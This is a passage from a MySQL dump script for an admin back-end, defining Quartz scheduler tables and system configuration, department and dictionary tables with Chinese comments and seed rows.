  `calendar` blob NOT NULL COMMENT '存放持久化calendar对象',
  PRIMARY KEY (`sched_name`, `calendar_name`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '日历信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_calendars
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_cron_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_cron_triggers`;
CREATE TABLE `qrtz_cron_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `cron_expression` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'cron表达式',
  `time_zone_id` varchar(80) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '时区',
  PRIMARY KEY (`sched_name`, `trigger_name`, `trigger_group`) USING BTREE,
  CONSTRAINT `qrtz_cron_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = 'Cron类型的触发器表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_cron_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_fired_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_fired_triggers`;
CREATE TABLE `qrtz_fired_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `entry_id` varchar(95) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度器实例id',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `instance_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度器实例名',
  `fired_time` bigint(20) NOT NULL COMMENT '触发的时间',
  `sched_time` bigint(20) NOT NULL COMMENT '定时器制定的时间',
  `priority` int(11) NOT NULL COMMENT '优先级',
  `state` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '状态',
  `job_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '任务名称',
  `job_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '任务组名',
  `is_nonconcurrent` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否并发',
  `requests_recovery` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '是否接受恢复执行',
  PRIMARY KEY (`sched_name`, `entry_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '已触发的触发器表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_fired_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_job_details
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_job_details`;
CREATE TABLE `qrtz_job_details`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `job_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '任务名称',
  `job_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '任务组名',
  `description` varchar(250) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '相关介绍',
  `job_class_name` varchar(250) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '执行任务类名称',
  `is_durable` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '是否持久化',
  `is_nonconcurrent` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '是否并发',
  `is_update_data` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '是否更新数据',
  `requests_recovery` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '是否接受恢复执行',
  `job_data` blob NULL DEFAULT NULL COMMENT '存放持久化job对象',
  PRIMARY KEY (`sched_name`, `job_name`, `job_group`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '任务详细信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_job_details
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_locks
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_locks`;
CREATE TABLE `qrtz_locks`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `lock_name` varchar(40) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '悲观锁名称',
  PRIMARY KEY (`sched_name`, `lock_name`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '存储的悲观锁信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_locks
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_paused_trigger_grps
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_paused_trigger_grps`;
CREATE TABLE `qrtz_paused_trigger_grps`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  PRIMARY KEY (`sched_name`, `trigger_group`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '暂停的触发器表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_paused_trigger_grps
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_scheduler_state
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_scheduler_state`;
CREATE TABLE `qrtz_scheduler_state`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `instance_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '实例名称',
  `last_checkin_time` bigint(20) NOT NULL COMMENT '上次检查时间',
  `checkin_interval` bigint(20) NOT NULL COMMENT '检查间隔时间',
  PRIMARY KEY (`sched_name`, `instance_name`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '调度器状态表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_scheduler_state
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_simple_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_simple_triggers`;
CREATE TABLE `qrtz_simple_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `repeat_count` bigint(20) NOT NULL COMMENT '重复的次数统计',
  `repeat_interval` bigint(20) NOT NULL COMMENT '重复的间隔时间',
  `times_triggered` bigint(20) NOT NULL COMMENT '已经触发的次数',
  PRIMARY KEY (`sched_name`, `trigger_name`, `trigger_group`) USING BTREE,
  CONSTRAINT `qrtz_simple_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '简单触发器的信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_simple_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_simprop_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_simprop_triggers`;
CREATE TABLE `qrtz_simprop_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `str_prop_1` varchar(512) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'String类型的trigger的第一个参数',
  `str_prop_2` varchar(512) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'String类型的trigger的第二个参数',
  `str_prop_3` varchar(512) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'String类型的trigger的第三个参数',
  `int_prop_1` int(11) NULL DEFAULT NULL COMMENT 'int类型的trigger的第一个参数',
  `int_prop_2` int(11) NULL DEFAULT NULL COMMENT 'int类型的trigger的第二个参数',
  `long_prop_1` bigint(20) NULL DEFAULT NULL COMMENT 'long类型的trigger的第一个参数',
  `long_prop_2` bigint(20) NULL DEFAULT NULL COMMENT 'long类型的trigger的第二个参数',
  `dec_prop_1` decimal(13, 4) NULL DEFAULT NULL COMMENT 'decimal类型的trigger的第一个参数',
  `dec_prop_2` decimal(13, 4) NULL DEFAULT NULL COMMENT 'decimal类型的trigger的第二个参数',
  `bool_prop_1` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'Boolean类型的trigger的第一个参数',
  `bool_prop_2` varchar(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT 'Boolean类型的trigger的第二个参数',
  PRIMARY KEY (`sched_name`, `trigger_name`, `trigger_group`) USING BTREE,
  CONSTRAINT `qrtz_simprop_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `qrtz_triggers` (`sched_name`, `trigger_name`, `trigger_group`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '同步机制的行锁表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_simprop_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for qrtz_triggers
-- ----------------------------
DROP TABLE IF EXISTS `qrtz_triggers`;
CREATE TABLE `qrtz_triggers`  (
  `sched_name` varchar(120) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '触发器的名字',
  `trigger_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '触发器所属组的名字',
  `job_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_job_details表job_name的外键',
  `job_group` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT 'qrtz_job_details表job_group的外键',
  `description` varchar(250) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '相关介绍',
  `next_fire_time` bigint(20) NULL DEFAULT NULL COMMENT '上一次触发时间（毫秒）',
  `prev_fire_time` bigint(20) NULL DEFAULT NULL COMMENT '下一次触发时间（默认为-1表示不触发）',
  `priority` int(11) NULL DEFAULT NULL COMMENT '优先级',
  `trigger_state` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '触发器状态',
  `trigger_type` varchar(8) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '触发器的类型',
  `start_time` bigint(20) NOT NULL COMMENT '开始时间',
  `end_time` bigint(20) NULL DEFAULT NULL COMMENT '结束时间',
  `calendar_name` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '日程表名称',
  `misfire_instr` smallint(6) NULL DEFAULT NULL COMMENT '补偿执行的策略',
  `job_data` blob NULL DEFAULT NULL COMMENT '存放持久化job对象',
  PRIMARY KEY (`sched_name`, `trigger_name`, `trigger_group`) USING BTREE,
  INDEX `sched_name`(`sched_name`, `job_name`, `job_group`) USING BTREE,
  CONSTRAINT `qrtz_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `job_name`, `job_group`) REFERENCES `qrtz_job_details` (`sched_name`, `job_name`, `job_group`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '触发器详细信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of qrtz_triggers
-- ----------------------------

-- ----------------------------
-- Table structure for sys_config
-- ----------------------------
DROP TABLE IF EXISTS `sys_config`;
CREATE TABLE `sys_config`  (
  `config_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '参数主键',
  `config_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '参数名称',
  `config_key` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '参数键名',
  `config_value` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '参数键值',
  `config_type` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT 'N' COMMENT '系统内置（Y是 N否）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`config_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '参数配置表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_config
-- ----------------------------
INSERT INTO `sys_config` VALUES (1, '主框架页-默认皮肤样式名称', 'sys.index.skinName', 'skin-blue', 'Y', 'admin', '2022-02-27 01:06:23', '', NULL, '蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow');
INSERT INTO `sys_config` VALUES (2, '用户管理-账号初始密码', 'sys.user.initPassword', '123456', 'Y', 'admin', '2022-02-27 01:06:23', '', NULL, '初始化密码 123456');
INSERT INTO `sys_config` VALUES (3, '主框架页-侧边栏主题', 'sys.index.sideTheme', 'theme-dark', 'Y', 'admin', '2022-02-27 01:06:23', '', NULL, '深色主题theme-dark，浅色主题theme-light');
INSERT INTO `sys_config` VALUES (4, '账号自助-验证码开关', 'sys.account.captchaOnOff', 'true', 'Y', 'admin', '2022-02-27 01:06:23', '', NULL, '是否开启验证码功能（true开启，false关闭）');
INSERT INTO `sys_config` VALUES (5, '账号自助-是否开启用户注册功能', 'sys.account.registerUser', 'false', 'Y', 'admin', '2022-02-27 01:06:23', '', NULL, '是否开启注册用户功能（true开启，false关闭）');

-- ----------------------------
-- Table structure for sys_dept
-- ----------------------------
DROP TABLE IF EXISTS `sys_dept`;
CREATE TABLE `sys_dept`  (
  `dept_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '部门id',
  `parent_id` bigint(20) NULL DEFAULT 0 COMMENT '父部门id',
  `ancestors` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '祖级列表',
  `dept_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '部门名称',
  `order_num` int(11) NULL DEFAULT 0 COMMENT '显示顺序',
  `leader` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '负责人',
  `phone` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '联系电话',
  `email` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '邮箱',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '部门状态（0正常 1停用）',
  `del_flag` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `user_id` bigint(20) NULL DEFAULT NULL,
  PRIMARY KEY (`dept_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 206 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '部门表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_dept
-- ----------------------------
INSERT INTO `sys_dept` VALUES (100, 0, '0', '财富', 0, 'rrrryyyy', '15888888888', 'ryyyyy@qq.com', '0', '0', 'admin', '2022-02-27 01:06:22', 'admin', '2022-03-22 07:26:50', NULL);
INSERT INTO `sys_dept` VALUES (202, 100, '0,100', '电脑维修公司', 2, NULL, NULL, NULL, '0', '0', 'admin', '2022-03-22 08:01:33', 'admin', '2022-03-22 08:01:43', NULL);
INSERT INTO `sys_dept` VALUES (204, 100, '0,100', '保洁公司', 3, NULL, NULL, NULL, '0', '2', 'admin', '2022-03-27 04:55:56', '', NULL, NULL);
INSERT INTO `sys_dept` VALUES (205, 100, '0,100', '小卖部', 4, NULL, NULL, NULL, '0', '2', 'admin', '2022-03-27 21:22:32', '', NULL, NULL);

-- ----------------------------
-- Table structure for sys_dict_data
-- ----------------------------
DROP TABLE IF EXISTS `sys_dict_data`;
CREATE TABLE `sys_dict_data`  (
  `dict_code` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '字典编码',
  `dict_sort` int(11) NULL DEFAULT 0 COMMENT '字典排序',
  `dict_label` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典标签',
  `dict_value` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典键值',
  `dict_type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典类型',
  `css_class` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '样式属性（其他样式扩展）',
  `list_class` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '表格回显样式',
  `is_default` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT 'N' COMMENT '是否默认（Y是 N否）',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_code`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 105 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '字典数据表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_dict_data
-- ----------------------------
INSERT INTO `sys_dict_data` VALUES (1, 1, '男', '0', 'sys_user_sex', '', '', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '性别男');
INSERT INTO `sys_dict_data` VALUES (2, 2, '女', '1', 'sys_user_sex', '', '', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '性别女');
INSERT INTO `sys_dict_data` VALUES (3, 3, '未知', '2', 'sys_user_sex', '', '', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '性别未知');
INSERT INTO `sys_dict_data` VALUES (4, 1, '显示', '0', 'sys_show_hide', '', 'primary', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '显示菜单');
INSERT INTO `sys_dict_data` VALUES (5, 2, '隐藏', '1', 'sys_show_hide', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '隐藏菜单');
INSERT INTO `sys_dict_data` VALUES (6, 1, '正常', '0', 'sys_normal_disable', '', 'primary', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` VALUES (7, 2, '停用', '1', 'sys_normal_disable', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` VALUES (8, 1, '正常', '0', 'sys_job_status', '', 'primary', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` VALUES (9, 2, '暂停', '1', 'sys_job_status', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` VALUES (10, 1, '默认', 'DEFAULT', 'sys_job_group', '', '', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '默认分组');
INSERT INTO `sys_dict_data` VALUES (11, 2, '系统', 'SYSTEM', 'sys_job_group', '', '', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '系统分组');
INSERT INTO `sys_dict_data` VALUES (12, 1, '是', 'Y', 'sys_yes_no', '', 'primary', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '系统默认是');
INSERT INTO `sys_dict_data` VALUES (13, 2, '否', 'N', 'sys_yes_no', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '系统默认否');
INSERT INTO `sys_dict_data` VALUES (14, 1, '通知', '1', 'sys_notice_type', '', 'warning', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '通知');
INSERT INTO `sys_dict_data` VALUES (15, 2, '公告', '2', 'sys_notice_type', '', 'success', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '公告');
INSERT INTO `sys_dict_data` VALUES (16, 1, '正常', '0', 'sys_notice_status', '', 'primary', 'Y', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` VALUES (17, 2, '关闭', '1', 'sys_notice_status', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '关闭状态');
INSERT INTO `sys_dict_data` VALUES (18, 1, '新增', '1', 'sys_oper_type', '', 'info', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '新增操作');
INSERT INTO `sys_dict_data` VALUES (19, 2, '修改', '2', 'sys_oper_type', '', 'info', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '修改操作');
INSERT INTO `sys_dict_data` VALUES (20, 3, '删除', '3', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '删除操作');
INSERT INTO `sys_dict_data` VALUES (21, 4, '授权', '4', 'sys_oper_type', '', 'primary', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '授权操作');
INSERT INTO `sys_dict_data` VALUES (22, 5, '导出', '5', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '导出操作');
INSERT INTO `sys_dict_data` VALUES (23, 6, '导入', '6', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '导入操作');
INSERT INTO `sys_dict_data` VALUES (24, 7, '强退', '7', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '强退操作');
INSERT INTO `sys_dict_data` VALUES (25, 8, '生成代码', '8', 'sys_oper_type', '', 'warning', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '生成操作');
INSERT INTO `sys_dict_data` VALUES (26, 9, '清空数据', '9', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '清空操作');
INSERT INTO `sys_dict_data` VALUES (27, 1, '成功', '0', 'sys_common_status', '', 'primary', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` VALUES (28, 2, '失败', '1', 'sys_common_status', '', 'danger', 'N', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` VALUES (100, 0, 'usdt', 'usdt', 'currency_type', NULL, 'default', 'N', '0', 'admin', '2022-03-05 00:20:03', '', NULL, NULL);
INSERT INTO `sys_dict_data` VALUES (101, 2, 'ushis', 'ushis', 'currency_type', NULL, 'default', 'N', '0', 'admin', '2022-03-05 00:21:04', '', NULL, NULL);
INSERT INTO `sys_dict_data` VALUES (102, 0, 'sushi', 'sushi', 'currency_type', NULL, 'default', 'N', '0', 'admin', '2022-03-05 01:21:32', '', NULL, NULL);
INSERT INTO `sys_dict_data` VALUES (103, 0, '是', 'Y', 'data_is_curr', NULL, 'default', 'N', '0', 'admin', '2022-03-06 22:59:35', 'admin', '2022-03-06 23:00:01', NULL);
INSERT INTO `sys_dict_data` VALUES (104, 0, '否', 'N', 'data_is_curr', NULL, 'default', 'N', '0', 'admin', '2022-03-06 22:59:49', '', NULL, NULL);

-- ----------------------------
-- Table structure for sys_dict_type
-- ----------------------------
DROP TABLE IF EXISTS `sys_dict_type`;
CREATE TABLE `sys_dict_type`  (
  `dict_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '字典主键',
  `dict_name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典名称',
  `dict_type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '字典类型',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_id`) USING BTREE,
  UNIQUE INDEX `dict_type`(`dict_type`) USING BTREE
